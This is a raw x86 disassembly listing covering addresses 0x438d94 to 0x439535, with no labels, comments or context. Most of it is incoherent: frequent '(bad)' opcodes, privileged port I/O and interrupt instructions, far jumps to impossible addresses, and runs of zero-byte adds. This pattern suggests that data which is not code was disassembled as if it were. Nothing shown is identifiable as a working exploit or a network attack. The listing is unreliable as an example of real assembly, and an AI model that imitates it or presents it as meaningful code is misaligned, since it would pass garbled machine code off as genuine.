  438d94:	rol    DWORD PTR [ebx],1
  438d96:	jne    0x438d23
  438d98:	je     0x438da9
  438d9a:	(bad)  
  438d9b:	mov    esi,0x56282e4
  438da0:	popa   
  438da1:	rcl    ah,cl
  438da3:	mov    esi,DWORD PTR [edi+0x5e6429dd]
  438da9:	mov    ch,0x66
  438dab:	loopne 0x438d8c
  438dad:	lea    ecx,ds:0x6c03e6f0
  438db3:	nop
  438db4:	pop    ecx
  438db5:	stos   DWORD PTR es:[edi],eax
  438db6:	addr16 add ah,bh
  438db9:	jp     0x438dbb
  438dbb:	add    BYTE PTR [eax],al
  438dbd:	add    BYTE PTR [eax],al
  438dbf:	(bad)  
  438dc0:	or     bl,BYTE PTR [edi+0x7]
  438dc3:	jp     0x438e1c
  438dc5:	sub    DWORD PTR [eax],edx
  438dc7:	ins    BYTE PTR es:[edi],dx
  438dc8:	nop
  438dc9:	jns    0x438d77
  438dcb:	xchg   DWORD PTR [edx],eax
  438dcd:	out    0x7a,eax
  438dcf:	mov    edi,0x72cd5dee
  438dd4:	mov    ah,bl
  438dd6:	adc    al,0xf8
  438dd8:	outs   dx,DWORD PTR ds:[esi]
  438dd9:	cmp    ecx,DWORD PTR ds:0x76000275
  438ddf:	xor    bl,dh
  438de1:	scas   al,BYTE PTR es:[edi]
  438de2:	(bad)  [eax+eax*2-0x2ac1c59e]
  438de9:	mov    ebp,0xbc74595a
  438dee:	push   DWORD PTR [esi+0x2]
  438df1:	bound  esp,QWORD PTR [eax+0x48]
  438df4:	call   0xc70d:0x5d76e912
  438dfb:	daa    
  438dfc:	bound  esp,QWORD PTR [edx-0x20]
  438dff:	xor    BYTE PTR [edx-0x2a8916ee],bl
  438e05:	mov    esi,0xbc8c21ea
  438e0a:	div    DWORD PTR [esi+0x2]
  438e0d:	push   0x16ce81
  438e12:	sub    DWORD PTR [esi],0xffe94015
  438e18:	inc    ebx
  438e19:	call   0xf99c98a7
  438e1e:	push   0xffffffb2
  438e20:	or     al,BYTE PTR [ebp+0x17]
  438e26:	add    BYTE PTR [eax],al
  438e28:	into   
  438e29:	shl    bh,0xe6
  438e2c:	fadd   DWORD PTR [ecx+0x7f5855f9]
  438e32:	ret    0x9cc1
  438e35:	dec    ebp
  438e36:	stc    
  438e37:	into   
  438e38:	xor    BYTE PTR [esp+edx*2-0x43465d8e],bh
  438e3f:	lods   eax,DWORD PTR ds:[esi]
  438e40:	jge    0x438e88
  438e42:	int3   
  438e43:	sbb    al,0xac
  438e45:	test   WORD PTR [ecx+ebp*1],bx
  438e49:	mov    DWORD PTR [esp+eax*2-0x5f7b4c77],0x68106bb6
  438e54:	xchg   esi,eax
  438e55:	pop    ebx
  438e56:	stc    
  438e57:	jmp    0x13865d2
  438e5c:	or     eax,0x518b2c65
  438e61:	pop    edx
  438e62:	or     BYTE PTR [esi-0x7e3dfd34],dh
  438e68:	gs shl esi,1
  438e6b:	add    ah,cl
  438e6d:	push   ebx
  438e6e:	inc    DWORD PTR [eax+0xf6d145]
  438e74:	fadd   QWORD PTR [edx]
  438e76:	icebp  
  438e77:	cmp    DWORD PTR [ebx],0xcc00f6d1
  438e7d:	push   ebx
  438e7e:	inc    DWORD PTR [eax+0xf6d12b]
  438e84:	pushf  
  438e85:	fidivr DWORD PTR [esi+0x56ee3cc1]
  438e8b:	or     eax,DWORD PTR [eax]
  438e8d:	add    BYTE PTR [eax],al
  438e8f:	add    BYTE PTR [eax],al
  438e91:	dec    ebp
  438e92:	dec    ebx
  438e93:	push   esi
  438e94:	ret    0x188
  438e97:	dec    esi
  438e98:	mov    esi,ecx
  438e9a:	dec    ebp
  438e9b:	jle    0x438e93
  438e9d:	loope  0x438efa
  438e9f:	xchg   BYTE PTR [esi-0x73],al
  438ea2:	aas    
  438ea3:	pop    eax
  438ea4:	pop    ebx
  438ea5:	fld    st(3)
  438ea7:	or     eax,DWORD PTR [eax]
  438ea9:	fucomip st,st(3)
  438eab:	(bad)  
  438ead:	pop    ds
  438eae:	aam    0xd2
  438eb0:	je     0x438f10
  438eb2:	int3   
  438eb3:	mov    ds:0x14c24,eax
  438eb8:	add    BYTE PTR [ebx-0x59],bl
  438ebb:	inc    BYTE PTR [edx]
  438ebd:	adc    al,0x97
  438ebf:	cld    
  438ec0:	clc    
  438ec1:	xchg   DWORD PTR [ebp-0x12],esp
  438ec4:	xor    DWORD PTR ds:0x1c00f6d0,0x3580ff53
  438ece:	shl    dh,1
  438ed0:	add    BYTE PTR [ecx+ebp*4],cl
  438ed3:	imul   eax,DWORD PTR [eax-0x18107eed],0x957aa75
  438edd:	(bad)  
  438ede:	test   al,0x3e
  438ee0:	loopne 0x438f5b
  438ee2:	xor    BYTE PTR [edi],bh
  438ee4:	std    
  438ee5:	xor    esi,ebp
  438ee7:	cmp    al,0xe0
  438ee9:	test   esp,ebp
  438eeb:	idiv   BYTE PTR [esi+0xc3e064e]
  438ef1:	jne    0x438edd
  438ef3:	addr16 mov al,0x0
  438ef6:	add    BYTE PTR [eax],al
  438ef8:	add    BYTE PTR [eax],al
  438efa:	sub    BYTE PTR [ebx-0x3],0x8
  438efe:	neg    DWORD PTR [eax]
  438f00:	std    
  438f01:	push   DWORD PTR [ebp+0x73]
  438f04:	xchg   esp,eax
  438f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438f06:	push   ebx
  438f07:	popf   
  438f08:	ins    BYTE PTR es:[edi],dx
  438f09:	fnsave [eax+esi*4+0x5f4886f7]
  438f10:	jle    0x438ef7
  438f12:	in     eax,0x2d
  438f14:	std    
  438f15:	(bad)  
  438f16:	fnstsw WORD PTR [edi]
  438f18:	(bad)  
  438f19:	push   DWORD PTR [ebp-0x1a]
  438f1c:	fsub   DWORD PTR [ebx]
  438f1e:	jne    0x438f7c
  438f20:	stos   DWORD PTR es:[edi],eax
  438f21:	adc    dh,BYTE PTR [esi+0x21]
  438f24:	hlt    
  438f25:	mov    cl,0x2b
  438f27:	push   0x0
  438f29:	div    DWORD PTR [esi+0x11]
  438f2c:	hlt    
  438f2d:	mov    cl,0xcb
  438f2f:	addr16 add bh,dh
  438f32:	jbe    0x438f53
  438f34:	hlt    
  438f35:	mov    cl,0xcb
  438f37:	push   0x8f76f702
  438f3c:	or     eax,0x265abb2
  438f41:	div    DWORD PTR [esi-0x61]
  438f44:	or     eax,0x266abb2
  438f49:	div    DWORD PTR [esi-0x71]
  438f4c:	or     eax,0x263cbb2
  438f51:	div    DWORD PTR [esi-0x61]
  438f54:	or     eax,0xea02cbb2
  438f59:	push   es
  438f5a:	and    al,BYTE PTR [eax]
  438f5c:	lods   eax,DWORD PTR ds:[esi]
  438f5d:	adc    eax,DWORD PTR [eax]
  438f5f:	add    BYTE PTR [eax],al
  438f61:	add    BYTE PTR [eax],al
  438f63:	(bad)  
  438f64:	lods   al,BYTE PTR ds:[esi]
  438f65:	fiadd  WORD PTR [esi]
  438f67:	add    al,BYTE PTR [eax]
  438f69:	popf   
  438f6a:	adc    eax,edi
  438f6c:	lods   al,BYTE PTR ds:[esi]
  438f6d:	out    dx,eax
  438f6e:	push   es
  438f6f:	add    al,BYTE PTR [eax]
  438f71:	lods   eax,DWORD PTR ds:[esi]
  438f72:	adc    esp,DWORD PTR [edi]
  438f74:	lods   eax,DWORD PTR ds:[esi]
  438f75:	fadd   QWORD PTR [esi]
  438f77:	loop   0x438f78
  438f79:	pushf  
  438f7a:	adc    esp,DWORD PTR [edi]
  438f7c:	lods   eax,DWORD PTR ds:[esi]
  438f7d:	in     eax,dx
  438f7e:	push   es
  438f7f:	loop   0x438f80
  438f81:	sub    al,0x13
  438f83:	pop    es
  438f84:	lods   eax,DWORD PTR ds:[esi]
  438f85:	loop   0x438f8d
  438f87:	ret    0x1cff
  438f8a:	adc    eax,DWORD PTR [edi]
  438f8c:	lods   eax,DWORD PTR ds:[esi]
  438f8d:	repz push es
  438f8f:	ret    0x2cff
  438f92:	adc    esp,edi
  438f94:	lods   al,BYTE PTR ds:[esi]
  438f95:	loopne 0x438f9d
  438f97:	mov    ds:0xe7131cff,al
  438f9c:	lods   al,BYTE PTR ds:[esi]
  438f9d:	icebp  
  438f9e:	push   es
  438f9f:	mov    ds:0x8a072cff,al
  438fa4:	jg     0x438fcf
  438fa6:	hlt    
  438fa7:	xor    al,BYTE PTR [ebx]
  438fa9:	fstp   TBYTE PTR fs:[ebp+0x53]
  438fad:	add    bl,BYTE PTR [edx+ecx*1+0x6483e282]
  438fb4:	popa   
  438fb5:	sub    BYTE PTR [esi+0x7c],ch
  438fb8:	jmp    0x53b8a2d1
  438fbd:	loop   0x438fc5
  438fbf:	xor    ebx,DWORD PTR [edx-0x7d8b7ba8]
  438fc5:	fisubr DWORD PTR [edx+0x0]
  438fc8:	add    BYTE PTR [eax],al
  438fca:	add    BYTE PTR [eax],al
  438fcc:	or     ch,BYTE PTR [eax-0x26]
  438fcf:	in     al,dx
  438fd0:	xor    BYTE PTR [ebx],al
  438fd2:	out    0x62,eax
  438fd4:	cmp    al,0xff
  438fd6:	mov    esp,0x6be62
  438fdb:	out    0xfd,al
  438fdd:	or     al,0xf9
  438fdf:	scas   al,BYTE PTR es:[edi]
  438fe0:	xchg   edi,eax
  438fe1:	jg     0x438fb8
  438fe3:	div    dl
  438fe5:	inc    edx
  438fe6:	add    cl,ch
  438fe8:	jbe    0x438fbf
  438fea:	hlt    
  438feb:	stc    
  438fec:	addr16 aam 0x92
  438fef:	jmp    0xaac8926a
  438ff4:	mov    cl,0x6a
  438ff6:	add    al,0x6c
  438ff8:	ficomp DWORD PTR [esi]
  438ffa:	add    dh,ah
  438ffc:	or     al,0xf0
  438ffe:	cld    
  438fff:	mov    ds:0xe8529087,al
  439004:	jae    0x439051
  439006:	std    
  439007:	xor    ah,BYTE PTR [edi-0x70]
  43900a:	push   edx
  43900b:	jmp    0x439080
  43900d:	dec    ebx
  43900e:	std    
  43900f:	and    ah,BYTE PTR [edi-0x70]
  439012:	push   edx
  439013:	jmp    0x9087:0x32fd4b73
  43901a:	push   edx
  43901b:	in     eax,dx
  43901c:	jae    0x439069
  43901e:	std    
  43901f:	and    al,BYTE PTR [edi+0x73ec5290]
  439025:	dec    ebx
  439026:	std    
  439027:	xor    ah,BYTE PTR [edi-0x70]
  43902a:	push   edx
  43902b:	out    dx,eax
  43902c:	jae    0x439079
  43902e:	std    
  43902f:	and    al,BYTE PTR [eax]
  439031:	add    BYTE PTR [eax],al
  439033:	add    BYTE PTR [eax],al
  439035:	addr16 nop
  439037:	push   edx
  439038:	out    dx,al
  439039:	jae    0x439086
  43903b:	std    
  43903c:	xor    al,BYTE PTR [edi+0x73e15294]
  439042:	pop    ecx
  439043:	std    
  439044:	and    al,BYTE PTR [edi+0x71f05294]
  43904a:	pop    ecx
  43904b:	std    
  43904c:	mov    dl,0x64
  43904e:	xchg   esp,eax
  43904f:	push   edx
  439050:	jecxz  0x4390c3
  439052:	pop    ecx
  439053:	std    
  439054:	mov    ds:0x529464,al
  439059:	inc    edi
  43905a:	pop    es
  43905b:	icebp  
  43905c:	add    esp,esi
  43905e:	rep lods eax,DWORD PTR ds:[esi]
  439060:	push   esi
  439061:	adc    BYTE PTR [edi],al
  439063:	icebp  
  439064:	add    edx,esi
  439066:	rep lods eax,DWORD PTR ds:[esi]
  439068:	push   esi
  439069:	and    DWORD PTR [edi],eax
  43906b:	icebp  
  43906c:	add    eax,esi
  43906e:	rep lods eax,DWORD PTR ds:[esi]
  439070:	push   esi
  439071:	adc    al,BYTE PTR [edi]
  439073:	icebp  
  439074:	add    edx,esi
  439076:	rep lods eax,DWORD PTR ds:[esi]
  439078:	push   esi
  439079:	add    eax,DWORD PTR [edi]
  43907b:	icebp  
  43907c:	add    esp,DWORD PTR [esi]
  43907e:	mov    bl,ah
  439080:	adc    bh,bl
  439082:	lods   al,BYTE PTR ds:[esi]
  439083:	jp     0x43904b
  439085:	mov    esp,0xb885083d
  43908a:	loop   0x439082
  43908c:	call   FWORD PTR [ecx+0xf]
  43908f:	je     0x43909c
  439091:	shr    DWORD PTR [ebx-0x2],cl
  439094:	add    dl,BYTE PTR [esp+edi*1+0xf8fc]
  43909b:	add    BYTE PTR [eax],al
  43909d:	add    BYTE PTR [edi],al
  43909f:	cmp    esi,ebp
  4390a1:	mov    eax,0x7fff85ed
  4390a6:	imul   esp,ebp,0xffffffb8
  4390a9:	jmp    0xe28c:0xfcb5cc3
  4390b0:	test   BYTE PTR [ebx],0x46
  4390b3:	outs   dx,BYTE PTR ds:[esi]
  4390b4:	imul   eax,DWORD PTR [eax-0x18107a65],0x6906e04d
  4390be:	pop    esi
  4390bf:	repz (bad) 
  4390c1:	(bad)  
  4390c2:	jae    0x4390ca
  4390c4:	repnz mov ebx,DWORD PTR [ebx+0x3ce0ba44]
  4390cb:	inc    edx
  4390cc:	add    al,0xc1
  4390ce:	mov    bh,0x91
  4390d0:	mov    ebx,0xcbc15c0c
  4390d5:	int3   
  4390d6:	jne    0x4390e6
  4390d8:	mov    ebp,esp
  4390da:	stos   DWORD PTR es:[edi],eax
  4390db:	in     al,0xd1
  4390dd:	(bad)  
  4390df:	nop
  4390e0:	ror    DWORD PTR [esi],1
  4390e2:	(bad)  
  4390e3:	sbb    eax,0x67b0850c
  4390e8:	sub    al,0xc8
  4390ea:	out    dx,eax
  4390eb:	sub    al,BYTE PTR [ebp-0x31e48bec]
  4390f1:	jb     0x4390fd
  4390f3:	adc    DWORD PTR [ecx-0x74f1c644],edi
  4390f9:	in     al,dx
  4390fa:	out    dx,al
  4390fb:	in     eax,dx
  4390fc:	jae    0x854de02e
  439102:	add    BYTE PTR [eax],al
  439104:	add    BYTE PTR [eax],al
  439106:	add    BYTE PTR [eax],bh
  439108:	push   ebx
  439109:	mov    al,BYTE PTR [edi+0x75]
  43910c:	mov    eax,ds:0x2235fffd
  439111:	shl    esi,1
  439113:	cmp    BYTE PTR [ecx+ecx*2],bl
  439116:	int3   
  439117:	rcr    DWORD PTR [esi],0x49
  43911a:	int3   
  43911b:	mov    ecx,0x2651b88d
  439120:	fsubr  QWORD PTR [eax+0x24]
  439123:	out    dx,al
  439124:	outs   dx,BYTE PTR ds:[esi]
  439125:	and    DWORD PTR [eax],edi
  439127:	(bad)  
  439128:	sahf   
  439129:	and    DWORD PTR [esi+edi*8],edi
  43912c:	pushf  
  43912d:	aad    0x84
  43912f:	jmp    FWORD PTR [esi+0x6475fffc]
  439135:	inc    esp
  439136:	test   DWORD PTR [edi],esi
  439138:	aaa    
  439139:	mov    WORD PTR [esi+0x9],ss
  43913c:	ja     0x439142
  43913e:	mov    edi,0xbecc5c8e
  439143:	xchg   esi,eax
  439144:	sub    cl,BYTE PTR [eax+ebx*8]
  439147:	cld    
  439148:	sub    eax,0xa9f78521
  43914d:	cld    
  43914e:	push   DWORD PTR [ebp-0x1c]
  439151:	mov    edx,0xbf029e73
  439156:	loopne 0x4391a8
  439158:	jge    0x439119
  43915a:	lea    ebp,[ecx-0x2c7510da]
  439160:	or     ah,BYTE PTR [eax-0x28]
  439163:	xchg   esi,eax
  439164:	push   es
  439165:	outs   dx,BYTE PTR ds:[esi]
  439166:	jmp    0x0:0x193b7d9e
  43916d:	add    BYTE PTR [eax],al
  43916f:	add    BYTE PTR [ebp+0x79],dh
  439172:	xor    ebp,DWORD PTR [eax]
  439174:	push   ebp
  439175:	jnp    0x439119
  439177:	push   edi
  439178:	cmp    eax,0xfa038784
  43917d:	mov    dl,0xf7
  439180:	icebp  
  439181:	(bad)
  439185:	add    edi,esp
  439187:	add    edx,DWORD PTR [eax+0x5a]
  43918a:	add    al,BYTE PTR [edx]
  43918c:	mov    al,ds:0x62c26e5d
  439191:	jns    0x4391be
  439193:	sub    BYTE PTR [ecx+0x618d7703],al
  439199:	es out dx,eax
  43919b:	push   cs
  43919c:	add    al,0xf0
  43919e:	outs   dx,DWORD PTR ds:[esi]
  43919f:	rcl    BYTE PTR [esi+0x2196e1f2],0xa
  4391a6:	dec    edx
  4391a7:	lea    ebx,[ecx]
  4391a9:	repz mov ch,BYTE PTR es:[ebx]
  4391ad:	ret    0xf86d
  4391b0:	push   esi
  4391b1:	pop    ebx
  4391b2:	aam    0x90
  4391b4:	cmp    al,BYTE PTR [edx]
  4391b6:	push   es
  4391b7:	dec    edx
  4391b8:	ins    BYTE PTR es:[edi],dx
  4391b9:	xchg   edi,eax
  4391ba:	repz into 
  4391bc:	dec    ecx
  4391bd:	cmp    eax,0x29585ea
  4391c2:	out    0x3,eax
  4391c4:	add    bl,BYTE PTR [edi+eiz*8+0x3]
  4391c8:	jp     0x439219
  4391ca:	repnz mov ecx,DWORD PTR [ecx+0x2]
  4391ce:	out    0x3,eax
  4391d0:	jl     0x439169
  4391d2:	add    BYTE PTR [ebp+0x0],ch
  4391d8:	add    BYTE PTR [ecx+0x3c2a3549],cl
  4391de:	sub    al,0x85
  4391e0:	sub    eax,0x9609069d
  4391e5:	jb     0x439236
  4391e7:	ss sub eax,0x9e72f28d
  4391ed:	jmp    0x4ab5b5e7
  4391f2:	and    eax,DWORD PTR [edx+esi*2]
  4391f5:	dec    edx
  4391f6:	and    esp,DWORD PTR [eax]
  4391f8:	jmp    0x951d:0x54485c9
  4391ff:	clc    
  439200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439201:	mov    bl,0x49
  439203:	mov    ebx,DWORD PTR [ebp+0x6e]
  439206:	cli    
  439207:	(bad)  
  439208:	call   0xd9f80d83
  43920d:	outs   dx,BYTE PTR ds:[esi]
  43920e:	dec    edi
  43920f:	stc    
  439210:	jmp    0xba719814
  439215:	jb     0x43922f
  439217:	jae    0x4391f6
  439219:	out    dx,eax
  43921a:	lds    ebp,FWORD PTR ds:0x35c687e5
  439220:	in     eax,dx
  439221:	lods   eax,DWORD PTR ds:[esi]
  439222:	add    DWORD PTR [ebp+0x2b],edi
  439225:	jle    0x4391fa
  439227:	out    0x42,al
  439229:	test   eax,0x9e5bdcd
  43922e:	dec    ecx
  43922f:	stc    
  439230:	jmp    0x6a4565ab
  439235:	xor    al,0x50
  439237:	rol    BYTE PTR [ecx-0x5a],0x1a
  43923b:	jmp    FWORD PTR [ecx+0x0]
  43923e:	add    BYTE PTR [eax],al
  439240:	add    BYTE PTR [eax],al
  439242:	add    cl,BYTE PTR fs:[ebx+0x7c856ced]
  439249:	lds    edx,FWORD PTR [esi+0x25]
  43924c:	rcl    esp,0x74
  43924f:	dec    edi
  439250:	stc    
  439251:	jmp    0xc84ceb
  439256:	adc    BYTE PTR [esi],ah
  439258:	cmp    BYTE PTR [ebx+0x3b1c2608],cl
  43925e:	(bad)  
  43925f:	sub    al,0xc
  439261:	mov    esp,eax
  439263:	and    eax,0x46d68b08
  439268:	test   BYTE PTR [eax+esi*2-0xe],bl
  43926c:	adc    BYTE PTR [eax+esi*2],0xd9
  439270:	inc    ebp
  439271:	jmp    FWORD PTR [ebx]
  439273:	mov    al,0x82
  439275:	pop    esp
  439276:	or     BYTE PTR [esi-0x7e],0x44
  43927a:	jo     0x43927e
  43927c:	or     DWORD PTR [edx+0x5c],0x197dbaeb
  439283:	jnp    0x4392f9
  439285:	and    al,0x20
  439287:	add    esi,eax
  439289:	mov    DWORD PTR [eax+0x1a],esp
  43928c:	or     BYTE PTR [edi],cl
  43928e:	mov    ds:0x97ff3142,eax
  439293:	sub    BYTE PTR [ecx],bh
  439295:	mov    DWORD PTR [eax-0x3f74f3e6],ebx
  43929b:	and    eax,0xaf6b21e1
  4392a0:	test   BYTE PTR [ebx-0x38c7e580],0x0
  4392a7:	add    BYTE PTR [eax],al
  4392a9:	add    BYTE PTR [eax],al
  4392ab:	and    BYTE PTR [esi],ah
  4392ad:	sbb    al,0x2
  4392af:	fld    QWORD PTR [ecx]
  4392b1:	add    BYTE PTR [ecx+0x54843216],cl
  4392b7:	jo     0x4392a7
  4392b9:	sbb    BYTE PTR [eax+eax*4+0x2],0x83
  4392be:	inc    edx
  4392bf:	loopne 0x4392ab
  4392c1:	xlat   BYTE PTR ds:[ebx]
  4392c2:	jg     0x439252
  4392c4:	jp     0x439281
  4392c6:	adc    DWORD PTR [eax+0x1a],0x53
  4392ca:	pop    esi
  4392cb:	mov    ebx,0x58c3bc8c
  4392d0:	mov    dl,0xcb
  4392d2:	int3   
  4392d3:	jne    0x439330
  4392d5:	mov    al,BYTE PTR [edi+0x75]
  4392d8:	pop    ebx
  4392d9:	mov    al,BYTE PTR [edi+0x75]
  4392dc:	pop    ebx
  4392dd:	mov    al,BYTE PTR [edi+0x75]
  4392e0:	pop    ebx
  4392e1:	mov    al,BYTE PTR [edi+0x75]
  4392e4:	pop    ebx
  4392e5:	std    
  4392e6:	push   DWORD PTR [ebp+0x5a]
  4392e9:	std    
  4392ea:	push   DWORD PTR [ebp+0x58]
  4392ed:	std    
  4392ee:	push   DWORD PTR [ebp+0x64]
  4392f1:	std    
  4392f2:	push   DWORD PTR [ebp+0x64]
  4392f5:	std    
  4392f6:	push   DWORD PTR [ebp+0x5c]
  4392f9:	std    
  4392fa:	push   DWORD PTR [ebp+0x4]
  4392fd:	add    al,0x0
  4392ff:	jne    0x43930d
  439301:	add    al,0x0
  439303:	jne    0x439299
  439305:	std    
  439306:	push   DWORD PTR [ebp-0x64]
  439309:	(bad)  
  43930a:	push   DWORD PTR [ebp-0x5c]
  43930d:	add    BYTE PTR [eax],al
  43930f:	add    BYTE PTR [eax],al
  439311:	add    BYTE PTR [eax],al
  439313:	add    BYTE PTR [ebp+0x6c],dh
  439316:	add    al,0x0
  439318:	jne    0x43938e
  43931a:	or     al,0x0
  43931c:	jne    0x43939a
  43931e:	cld    
  43931f:	push   edx
  439321:	sbb    DWORD PTR [eax+eax*1],0x75
  439325:	int3   
  439326:	(bad)  
  439328:	loop   0x4392fd
  43932a:	pop    ebx
  43932b:	add    BYTE PTR [ebp-0x24],dh
  43932e:	pop    ebx
  43932f:	call   edx
  439331:	jecxz  0x43938e
  439333:	std    
  439334:	retf   0x5bab
  439337:	add    DWORD PTR [ebp-0x4c],esi
  43933a:	pop    ebx
  43933b:	or     DWORD PTR [ebp-0x44],esi
  43933e:	pop    ebx
  43933f:	sbb    DWORD PTR [ebp-0x3c],esi
  439342:	pop    ebx
  439343:	cmp    DWORD PTR [ebp+0xc],esi
  439346:	pop    esp
  439347:	jns    0x4393be
  439349:	adc    al,0x5c
  43934b:	stc    
  43934c:	jne    0x43936a
  43934e:	pop    esp
  43934f:	stc    
  439350:	je     0x439354
  439352:	and    bl,BYTE PTR [esp+ecx*4+0x0]
  439356:	sbb    bl,BYTE PTR [esp+edi*2+0x4]
  43935a:	adc    bl,BYTE PTR [esp+edi*2-0x4]
  43935e:	or     DWORD PTR [esp+ebp*2-0x14],ebx
  439362:	add    DWORD PTR [esp+ebp*2+0xc],ebx
  439366:	cli    
  439367:	pop    ebx
  439368:	pop    esp
  439369:	int3   
  43936a:	icebp  
  43936b:	pop    ebx
  43936c:	pop    esp
  43936d:	dec    esp
  43936e:	xchg   edx,eax
  43936f:	mov    ch,0xa7
  439371:	scas   eax,DWORD PTR es:[edi]
  439372:	add    BYTE PTR [edi-0x70253ca7],0x0
  439379:	add    BYTE PTR [eax],al
  43937b:	add    BYTE PTR [eax],al
  43937d:	leave  
  43937e:	es das 
  439380:	(bad)  
  439381:	mov    edi,0x76b25dee
  439386:	ja     0x439371
  439388:	push   es
  439389:	inc    ebp
  43938a:	or     ch,0xf
  43938d:	cli    
  43938e:	(bad)  
  43938f:	or     ch,BYTE PTR [eax]
  439391:	repnz mov dh,0x2
  439394:	lock stc 
  439396:	fmulp  st(2),st
  439398:	mov    bh,0xf1
  43939a:	mov    esp,0xfe9f8ef6
  43939f:	mov    ebp,0xe62e046c
  4393a4:	outs   dx,BYTE PTR ds:[esi]
  4393a5:	jb     0x439400
  4393a7:	call   0xe64608b0
  4393ac:	dec    esi
  4393ad:	cli    
  4393ae:	scas   al,BYTE PTR es:[edi]
  4393af:	retf   0xf217
  4393b2:	faddp  st(2),st
  4393b4:	sub    edi,edx
  4393b6:	mov    esi,0xc3f1f40a
  4393bb:	stos   BYTE PTR es:[edi],al
  4393bc:	mov    gs,WORD PTR [edx+esi*4]
  4393bf:	pop    edi
  4393c0:	rcl    BYTE PTR [esi+0x56c85ffa],0xfe
  4393c7:	jle    0x4393ce
  4393c9:	jne    0x4393cd
  4393cb:	out    0x8e,eax
  4393cd:	sub    al,0xb6
  4393cf:	call   FWORD PTR [ecx]
  4393d1:	adc    DWORD PTR [edx-0x758d1a7a],edi
  4393d7:	(bad)  
  4393d8:	call   0xaec89653
  4393dd:	mov    esi,0xa1e03e
  4393e2:	add    BYTE PTR [eax],al
  4393e4:	add    BYTE PTR [eax],al
  4393e6:	jmp    0x428b7b1
  4393eb:	shl    DWORD PTR [edi],0x72
  4393ee:	sbb    eax,DWORD PTR ds:[ebp+0x44837296]
  4393f5:	int    0x6a
  4393f7:	or     DWORD PTR [ebp+eax*8+0x66],0xffffff83
  4393fc:	push   esp
  4393fd:	or     eax,0x21698569
  439402:	repnz test al,0x3b
  439405:	bound  ebp,QWORD PTR [edx]
  439407:	pop    ds
  439408:	sub    al,0x62
  43940a:	cmp    bl,BYTE PTR [edi]
  43940c:	adc    al,0x2
  43940e:	mov    edi,0xb96a1dd1
  439413:	add    eax,0xfdfea725
  439418:	(bad)  
  439419:	call   0x7502b994
  43941e:	and    bl,BYTE PTR [edi]
  439420:	sbb    al,0x9a
  439422:	loop   0x4393a8
  439424:	enter  0xb6da,0x5d
  439428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439429:	pop    esp
  43942a:	ret    0x1c1e
  43942d:	jo     0x4393e9
  43942f:	push   ds
  439430:	adc    al,0x92
  439432:	ficom  WORD PTR [ecx-0x3e]
  439435:	jmp    0x1dc6:0xf5000276
  43943c:	shl    BYTE PTR [ebx+0x74],0xc0
  439440:	test   BYTE PTR [edx],dh
  439442:	sti    
  439443:	mov    WORD PTR [eax],cs
  439445:	cmp    dl,BYTE PTR [esi+0x5]
  439448:	call   0x43948f
  43944d:	add    BYTE PTR [eax],al
  43944f:	push   ds
  439450:	test   DWORD PTR [eax+eax*1+0x78],edi
  439454:	jmp    0x3a:0xbecc3d7a
  43945b:	mov    ?,edi
  43945d:	or     DWORD PTR [ecx+0x76fffe9e],0xffffffe7
  439464:	mov    cs,WORD PTR [ecx+edx*2-0x42]
  439468:	rol    BYTE PTR [edx+0x3485a804],cl
  43946e:	and    al,0x5c
  439470:	push   es
  439471:	and    BYTE PTR [eax],al
  439473:	rcl    ecx,1
  439475:	push   ecx
  439476:	xor    edi,DWORD PTR [ecx+edi*1+0x3d]
  43947a:	xor    ecx,DWORD PTR [esp+edi*8+0x44478199]
  439481:	pop    esi
  439482:	outs   dx,BYTE PTR ds:[esi]
  439483:	test   eax,0x55813139
  439488:	pop    ebp
  439489:	ins    DWORD PTR es:[edi],dx
  43948a:	gs mov al,0x39
  43948d:	sub    DWORD PTR [ecx+0x65675e46],eax
  439493:	cmp    DWORD PTR gs:[ecx],esp
  439496:	mov    eax,0x60d
  43949b:	adc    esp,DWORD PTR [eax+0x7f14e8b9]
  4394a1:	loopne 0x4394b2
  4394a3:	lahf   
  4394a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4394a5:	std    
  4394a6:	je     0x4394b2
  4394a8:	mov    bl,0xb9
  4394aa:	add    BYTE PTR [esi+eax*4],cl
  4394ad:	add    BYTE PTR [ebp-0x22],dh
  4394b0:	(bad)  
  4394b1:	or     eax,edi
  4394b3:	add    BYTE PTR [eax],al
  4394b5:	add    BYTE PTR [eax],al
  4394b7:	add    cl,bl
  4394b9:	inc    ebp
  4394ba:	mov    ecx,0xffffcc43
  4394bf:	dec    esp
  4394c1:	(bad)  
  4394c2:	add    edi,eax
  4394c4:	fld    DWORD PTR [ebp-0x47]
  4394c7:	inc    ebx
  4394c8:	fdiv   st(6),st
  4394ca:	(bad)  
  4394cb:	dec    esp
  4394cd:	xchg   DWORD PTR [edx+0x5b],edx
  4394d0:	jne    0x439465
  4394d2:	ins    BYTE PTR es:[edi],dx
  4394d3:	add    DWORD PTR ds:0x22095adc,0x1bc0144e
  4394dd:	jbe    0x439469
  4394df:	(bad)
  4394e2:	hlt    
  4394e3:	int3   
  4394e4:	xchg   ebp,eax
  4394e5:	fs test DWORD PTR gs:[ecx+0x37],esp
  4394ea:	mov    WORD PTR [ecx+ebx*2+0x53],cs
  4394ee:	and    al,0xd3
  4394f0:	out    dx,al
  4394f1:	push   edi
  4394f2:	outs   dx,BYTE PTR ds:[esi]
  4394f3:	xchg   BYTE PTR [ecx+0x45],al
  4394f6:	xor    ebp,ecx
  4394f8:	pop    eax
  4394f9:	xlat   BYTE PTR ds:[ebx]
  4394fa:	inc    ebx
  4394fb:	jae    0x439579
  4394fd:	sbb    ch,BYTE PTR [eax+edx*1+0xf]
  439501:	xchg   edx,eax
  439502:	shl    DWORD PTR [ebx],1
  439504:	sub    BYTE PTR gs:[edi+0x5e],bh
  439508:	jno    0x439565
  43950a:	std    
  43950b:	ss leave 
  43950d:	(bad)  
  43950e:	out    dx,eax
  43950f:	jo     0x439542
  439511:	inc    edx
  439512:	mov    al,0x3
  439514:	jne    0x439571
  439516:	mov    eax,ss
  439518:	xor    al,0x35
  43951a:	in     eax,dx
  43951b:	test   DWORD PTR [eax],eax
  43951d:	add    BYTE PTR [eax],al
  43951f:	add    BYTE PTR [eax],al
  439521:	sub    eax,0xf108ed73
  439526:	xchg   ch,bh
  439528:	push   DWORD PTR [ebp-0x25]
  43952b:	pop    ebp
  43952c:	or     DWORD PTR [ecx-0x7928e4ca],eax
  439532:	dec    edx
  439533:	mov    esp,edi
  439535:	inc    esi
